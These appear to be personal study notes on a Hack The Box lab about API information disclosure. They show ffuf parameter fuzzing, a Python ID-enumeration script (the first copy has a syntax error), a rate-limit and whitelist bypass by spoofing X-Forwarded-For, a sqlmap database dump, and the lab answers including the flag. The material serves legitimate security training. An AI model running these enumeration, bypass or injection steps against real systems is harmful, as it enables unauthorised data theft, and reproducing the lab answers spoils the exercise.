.As already discussed, security-related inefficiencies or misconfigurations in a web service or API can result in information disclosure.

When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.

## Information Disclosure through Fuzzing

Proceed to the end of this section and click on`Click here to spawn the target system!` or the`Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.

Suppose we are assessing an API residing in`http://<TARGET IP>:3003`.

Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.


```shell-session
smoothment@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'

```

We notice a similar response size in every request. This is because supplying any parameter will return the same text, not an error like 404.

Let us filter out any responses having a size of 19, as follows:


```shell-session
smoothment@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19

```

It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.

```shell-session
smoothment@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

Find below a Python script that could automate retrieving all information that the API returns (save it as`brute_api.py`).


```python
import requests, sys

def brute():
 try:
 value = range(10000)
 for val in value:
 url = sys.argv[1]
 r = requests.get(url + '/?id='+str(val))
 if "position" in r.text:
 print("Number found!", val)
 print(r.text)
 except IndexError
 
 print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

```ad-important
- We import two modules _requests_ and _sys_. _requests_ allows us to make HTTP requests (GET, POST, etc.), and _sys_ allows us to parse system arguments.
- We define a function called _brute_, and then we define a variable called _value_ which has a range of _10000_. _try_ and _except_ help in exception handling.
- _url = sys.argv[1]_ receives the first argument.
- _r = requests.get(url + '/?id='+str(val))_ creates a response object called _r_ which will allow us to get the response of our GET request. We are just appending _/?id=_ to our request and then _val_ follows, which will have a value in the specified range.
- _if "position" in r.text:_ looks for the _position_ string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return _[]_.
```

The above script can be run, as follows.

```shell-session
smoothment@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...
```

Now you can proceed to the end of this section and answer the first question!

**TIP**: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.


```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
 header("HTTP/1.1 401 Unauthorized");
}
else
{
 print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

The issue here is that the code compares the _HTTP_X_FORWARDED_FOR_ header to the possible _whitelist_ values, and if the _HTTP_X_FORWARDED_FOR_ is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the _X-Forwarded-For_ header and the value to one of the IPs from the array.

## Information Disclosure through SQL Injection

SQL injection vulnerabilities can affect APIs as well. That _id_ parameter looks interesting. Try submitting classic SQLi payloads and answer the second question.

![Pasted image 20250219154858.png](../../../../IMAGES/Pasted%20image%2020250219154858.png)

Let's use this script to answer the first question:

```python
import requests, sys

def brute():
 try:
 value = range(10000)
 for val in value:
 url = sys.argv[1]
 r = requests.get(url + '/?id='+str(val))
 if "position" in r.text:
 print("Number found!", val)
 print(r.text)
 except IndexError:
 print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

We get the following output:

```
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
Number found! 3
[{"id":"3","username":"WebServices","position":"3"}]

```

Answer is:

```
WebServices
```

For the SQLI question, we can use `sqlmap`:

```
sqlmap -u 'http://IP:3003/?id=1' --dump
```

We get this output:

```
Database: htb
Table: users
[4 entries]
+---------+--------------------------------+------------+
| id | username | position |
+---------+--------------------------------+------------+
| 1 | admin | 1 |
| 2 | HTB-User-John | 2 |
| 3 | WebServices | 3 |
| 8374932 | HTB{THE_FL4G_FOR_SQLI_IS_H3RE} | 736373 |
+---------+--------------------------------+------------+
```

Flag is:

```
HTB{THE_FL4G_FOR_SQLI_IS_H3RE}
```
